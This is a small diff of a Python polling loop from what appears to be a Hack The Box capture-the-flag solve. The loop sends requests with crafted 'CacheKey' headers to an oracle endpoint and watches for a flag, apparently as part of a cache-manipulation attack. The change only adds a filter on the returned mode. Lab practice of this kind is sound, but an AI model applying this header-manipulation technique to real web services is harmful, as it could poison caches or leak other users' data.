@@ -30,7 +30,7 @@ while time.time() < deadline:
     for tag in TAGS:
         e = requests.get(BASE + "/oracle/x/1", headers={"CacheKey": "omni-" + tag}, timeout=30)
         m = re.search(r"Mode: ([^<]*)", e.text)
-        if m and seen.get(tag) != m.group(1):
+        if m and m.group(1) != "x" and seen.get(tag) != m.group(1):
             seen[tag] = m.group(1)
             print(tag, "->", m.group(1), flush=True)
     if "F" in seen and "HTB{" in seen["F"]:
